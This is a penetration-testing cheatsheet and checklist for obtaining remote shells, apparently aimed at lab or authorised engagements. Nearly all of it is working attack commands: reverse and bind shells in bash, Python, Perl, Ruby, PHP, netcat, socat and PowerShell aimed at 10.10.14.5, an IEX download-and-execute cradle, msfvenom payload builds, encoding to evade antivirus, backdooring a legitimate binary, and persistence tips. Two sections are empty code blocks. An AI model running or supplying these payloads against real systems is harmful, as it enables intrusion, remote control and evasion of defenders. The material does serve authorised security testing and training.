## Cheatsheet

### Listener (catch everything)
```bash
nc -lvnp 4444                              # basic netcat listener
rlwrap nc -lvnp 4444                       # with readline (arrow keys, history)
socat -d -d TCP-LISTEN:4444,reuseaddr -    # socat listener
# msfconsole handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
```

### Bash Reverse Shell
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
bash -c 'exec bash -i &>/dev/tcp/10.10.14.5/4444 <&1'
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

### Python Reverse Shell
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl / Ruby / PHP Reverse Shells
```bash
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e 'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat Reverse Shell
```bash
nc -e /bin/sh 10.10.14.5 4444                                   # if -e available
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f   # no -e
```

### Socat Reverse Shell (fully TTY)
```bash
# listener
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
# victim
socat TCP:10.10.14.5:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

### Bind Shells
```bash
# victim listens, you connect in
nc -lvnp 4444 -e /bin/sh                                        # linux victim
ncat -lvnp 4444 -e cmd.exe                                      # windows victim
# attacker
nc <victim-ip> 4444
```

### PowerShell Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$rb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
```

### Nishang / IEX One-Liner
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"
```

```bash

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter EXE (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# Java WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# Raw shellcode (C buffer)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
```

### msfvenom — Encoding & Badchars
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -b '\x00\x0a\x0d' -f exe -o enc.exe

# Inject into legit binary, keep original working (-k)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe -k -f exe -o backdoored.exe
```

### TTY Upgrade (the standard dance)
```bash
# 1. in the dumb shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (or) script -qc /bin/bash /dev/null
# (or) /usr/bin/script -qc /bin/bash /dev/null

# 2. background with CTRL+Z, then in YOUR terminal
stty raw -echo; fg
# press enter

# 3. back in the shell
export TERM=xterm
export SHELL=bash
stty rows 50 columns 200
```

```bash

```

### URL-Encode a Reverse Shell (for RCE params)
```bash

```

### Base64 Encode a PowerShell Payload
```bash
# Linux side
PAYLOAD='$c=New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);...'
echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
# victim side
powershell -nop -w hidden -enc <base64>
```

## Checklist

### Choosing the Shell
- [ ] Platform identified (Linux / Windows / embedded)
- [ ] Architecture confirmed (x86 / x64 / ARM)
- [ ] Known interpreters on the box checked (`which python bash perl php nc socat`)
- [ ] Egress direction decided (reverse — common; bind — only if you can reach the target port)
- [ ] Staged vs stageless chosen (stageless = more reliable, bigger; staged = smaller, needs handler)
- [ ] AV / EDR presence assumed — plan encoding or living-off-the-land payload

### Setting Up the Listener
- [ ] Attacker IP pointed at the right interface (tun0 for VPN labs)
- [ ] Port chosen that egresses from the target network (80, 443, 53 beat 4444)
- [ ] Listener up BEFORE the payload fires
- [ ] Using `rlwrap nc` or `multi/handler` so you don't lose the session on the first Ctrl+C

### Firing the Payload
- [ ] Payload URL-encoded if delivered via HTTP parameter
- [ ] Quotes escaped properly for the injection context
- [ ] If shell doesn't come back: tcpdump on the attacker side to confirm packet arrival
- [ ] If packets arrive but no shell: wrong payload for the shell interpreter (sh vs bash vs dash)

### Upgrading the Shell
- [ ] Spawn PTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`)
- [ ] CTRL+Z, then `stty raw -echo; fg`, then Enter
- [ ] `export TERM=xterm` so clear, vim, less work
- [ ] `stty rows X columns Y` sized to your terminal
- [ ] Confirm arrow keys, tab-complete, and Ctrl+C now behave

### Persistence / Resilience
- [ ] Session backgrounded (`bg` / Meterpreter `background`)
- [ ] Consider a second channel (SSH key, scheduled task, cron) before you need it
- [ ] Note the full command used to fire the payload in your notes — you'll need it again

### Operator Hygiene
- [ ] Don't type `whoami` as the first command on a monitored box — assume logging
- [ ] Prefer encrypted channels (socat SSL, HTTPS Meterpreter) on real engagements
- [ ] Clean up webshells and uploaded binaries at the end of the test
- [ ] Record LHOST/LPORT/payload in your report so the client can hunt for IOCs
